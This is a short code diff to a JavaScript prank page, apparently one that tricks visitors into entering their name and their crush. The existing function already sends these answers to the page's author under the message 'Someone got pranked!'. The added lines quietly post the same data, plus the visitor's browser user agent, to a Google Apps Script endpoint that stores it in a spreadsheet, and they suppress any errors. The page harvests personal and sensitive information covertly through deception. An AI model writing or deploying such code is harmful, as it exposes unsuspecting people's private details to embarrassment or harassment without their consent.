@@ -807,6 +807,18 @@ function sendToMe(name, crush) {
             message: `😈 Someone got pranked!\n\n👤 Name: ${name}\n💕 Crush: ${crush}\n🕐 Time: ${new Date().toLocaleString()}`,
         })
     }).catch(() => {});
+
+    // Also save to Google Sheets 📊
+    fetch('https://script.google.com/macros/s/AKfycbw1olWU6evRIS7Hwo3_TzDGUQiylNJOKKy514JooZCD2mSH7VLITt2MfPybWEwzZFGr/exec', {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            name: name,
+            crush: crush,
+            device: navigator.userAgent.slice(0, 80)
+        })
+    }).catch(() => {});
 }
 
 // ============================================
